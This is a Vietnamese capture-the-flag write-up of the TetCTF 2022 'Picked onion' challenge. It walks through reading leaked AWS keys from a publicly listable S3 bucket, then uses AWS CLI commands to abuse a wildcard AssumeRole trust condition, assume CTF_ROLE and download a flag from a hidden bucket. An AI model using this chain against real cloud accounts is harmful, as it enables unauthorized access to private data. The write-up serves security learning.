---
title: TetCTF 2022 | Web Exploitation | Picked onion
date: 2022-01-03-15:17:00
---

# Picked onion

![chall](https://user-images.githubusercontent.com/82533607/147910715-ae6e2f99-a294-4397-88bb-878d50561751.png)

## Reconaisance

Truy cập vào URL, ta thấy có một mục có tên là `Secret`, thử truy cập và thấy một bức ảnh. Ctrl U (view-source) thì thấy bức ảnh `href` là một `s3 bucket` có tên là `secret-tetctf`:


![secret_img](https://user-images.githubusercontent.com/82533607/147911410-fa0489b2-e116-4a55-8f8c-3ebfe9588b4f.png)

Điều đáng chú ý ở đây, là khi sửa URL thành `https://secret-tetctf.s3.amazonaws.com/` thì ta thấy:


![first_leak](https://user-images.githubusercontent.com/82533607/147911956-a3d47c09-f901-4263-8f59-76a4fab0140e.png)

Có thể chia làm 3 đoạn như sau:

```
secret-tetctf1000false
I've_Got_a_Secret.jpg2021-12-31T07:12:14.000Z"8176cb55798ee6c7df58496312ca82d8"12949STANDARD
secret2021-12-31T07:15:50.000Z"1ace2f1a8925799880ad32ef47b3e9d9"1239STANDARD
```

Đây là một lỗi Access Control của S3 Bucket, tại đây, ta có thể thấy còn một file `secret` nữa, mình sẽ tải nó về bằng URL: `https://secret-tetctf.s3.amazonaws.com/secret` và đọc nó:


![secret_file](https://user-images.githubusercontent.com/82533607/147912573-6842e886-3c0d-4e54-a0bf-2e909c343f7e.png)

Ta thu được `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` và `REGION_NAME` của IAM User được sử dụng cho `dynamodb`.

## Exploit

Ban đầu khi đọc qua source code thì mình thấy nó giống hoàn toàn với [bài viết này](https://ctrsec.io/index.php/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app/) của anh Chi Tran, nhưng tất nhiên, nếu vậy thì đơn giản quá:

![fail_1](https://user-images.githubusercontent.com/82533607/147912969-f153ba6d-61a9-491f-8b65-1ee78a979c63.png)

Có thể thấy, vấn đề ở đây là IAM User ddb_user mà ta ddnag sử dụng không có quyền hạn gì mấy để thực hiện exploit như bài viết ở trên.

Sau một hồi lục lọi trên doc của AWS thì mình thấy điều này:

```console
$ aws iam list-roles
{
    "Roles": [
        ...
        {
            "Path": "/",
            "RoleName": "CTF_ROLE",
            "RoleId": "AROAXNIS54O****************",
            "Arn": "arn:aws:iam::************:role/CTF_ROLE",
            "CreateDate": "2021-12-29T15:30:56Z",
            "AssumeRolePolicyDocument": {
                "Version": "2008-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "*"
                        },
                        "Action": "sts:AssumeRole",
                        "Condition": {
                            "StringLike": {
                                "aws:PrincipalArn": "arn:aws:iam::*:role/*-Accessing_Tet_CTF_Flag*"
                            }
                        }
                    }
                ]
            },
            "Description": "CTF_ROLE",
            "MaxSessionDuration": 3600
        }
    ]
}

```

Cùng hiểu một chút về đoạn JSON ở trên nhé?

Đây là một policy cho việc AssumeRole, ta thu được khá nhiều thông tin, đặc biệt nhất là Condittion cho việc AssumeRole, đó là chuỗi PrincipalArn trong request phải chứa một chuỗi `<anything>-Accessing_Tet_CTF_Flag<anything>`, cụ thể hơn thì chính xác cái user gửi request AssumeRole phải mang một IAM Role có tên với định dạng kể trên, như vậy, để thực hiện exploit, ta cần:

- Tạo một IAM User.

- Tạo một IAM Role có tên dưới dạng `<anything>-Accessing_Tet_CTF_Flag<anything>` mà IAM User vừa tạo có thể AssumeRole được.

- AssumeRole `<anything>-Accessing_Tet_CTF_Flag<anything>` vào IAM User đã tạo và lưu các creditials được trả về.

- AssumeRole `CTF_ROLE` ở trên và IAM User đã tạo, lưu lại creditials được trả về.

Giải thích lại một chút về ARN trong AWS, ARN là một chuỗi có dạng: `arn:partition:service:region:account:resource`, khi IAM User gửi bất kì request nào có yêu cầu credential, các chuỗi ARN sẽ được gửi đi, và chúng ta có thể sử dụng các chuỗi ARN này để viết policy phân quyền theo IAM Role cho các IAM User với điều kiện cụ thể.

Quay lại với vấn đề chính, vì không có AWS account để tạo IAM User nên mình đã inbox mượn anh Chi Tran một IAM User.

Sử dụng `aws configure` và điền các thông tin vào:

```console
$ aws configure
AWS Access Key ID [********************]: AKIAXNIS************
AWS Secret Access Key [********************]: VmK2ZWUVZ************************
Default region name [us-east-1]: 
Default output format [json]: 
```

Sau đó, tạo một file `Trust-policy.json`, sử dụng làm Policy cho Role mới (đừng làm theo ở thực tế, vì lý do bảo mật):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "*" // allow all, no condittion
      },
      "Action": "sts:AssumeRole",
      "Condition": {}
    }
  ]
}
```

Và sử dụng `aws iam create-role --role-name <anything>-Accessing_Tet_CTF_Flag<anything> --assume-role-policy-document file://Trust-policy.json` để tạo Role, nhớ note lại ARN ở output

AssumeRole:

```console
$ aws sts assume-role --role-arn "arn:aws:iam::***************:role/<anything>-Accessing_Tet_CTF_Flag<anything>" --role-session-name <anyname>
{
    "Credentials": {
        "AccessKeyId": "access_key_id_here",
        "SecretAccessKey": "secret_access_key_here",
        "SessionToken": "long_token_here",
        "Expiration": "2022-01-03T09:02:51Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "******************:<anyname>",
        "Arn": "arn:aws:sts::***************:assumed-role/<anything>-Accessing_Tet_CTF_Flag<anything>/<anyname>"
    }
}
```

Lưu credential vào Env:

```console
$ export AWS_ACCESS_KEY_ID=<"AccessKeyId">
$ export AWS_SECRET_ACCESS_KEY=<"SecretAccessKey">
$ export AWS_SESSION_TOKEN=<"SessionToken">
```

Tiến hành AssumeRole `CTF_ROLE`:

```console
$ aws sts assume-role --role-arn "arn:aws:iam::***************:role/CTF_ROLE" --role-session-name <anyname>
{
    "Credentials": {
        "AccessKeyId": "access_key_id_here",
        "SecretAccessKey": "secret_access_key_here",
        "SessionToken": "long_token_here",
        "Expiration": "2022-01-03T09:02:51Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "******************:<anyname>",
        "Arn": "arn:aws:sts::***************:assumed-role/CTF_ROLE/<anyname>"
    }
}
```

Và lại lưu credentials:

```console
$ export AWS_ACCESS_KEY_ID=<"AccessKeyId">
$ export AWS_SECRET_ACCESS_KEY=<"SecretAccessKey">
$ export AWS_SESSION_TOKEN=<"SessionToken">
```

Lúc này, ta đã có Role CTF_ROLE, nếu chưa chắc chắn, có thể kiểm tra bằng `aws sts get-caller-identity`, nếu thấy CTF_ROLE thì đã thành công.

Tiến hành list các bucket:

```console
$ aws s3api list-buckets --query "Buckets[].Name"
[
    "secret-tetctf",
    "tet-ctf-secret"
]
```

Vậy là ta thấy thêm một bucket nữa tên là `tet-ctf-secret`, kiểm tra xem trên đó có gì:

```console
$ aws s3 ls s3://tet-ctf-secret
2021-12-29 22:18:42         29 flag
```

Có file flag, thử lấy nó về và đọc:

```console
$ aws s3 cp s3://tet-ctf-secret/flag flag
download: s3://tet-ctf-secret/flag to ./flag 

$ cat flag
TetCTF{AssumE_R0le-iS-A-MuSt}
```

Done, flag: `TetCTF{AssumE_R0le-iS-A-MuSt}`

> Cảm ơn anh Chi Tran, đồng thời là người ra đề của chall này, đã cho em mượn IAM User và chỉ dẫn em trong quá trình giải, cũn như là học thêm kiến thức mới!
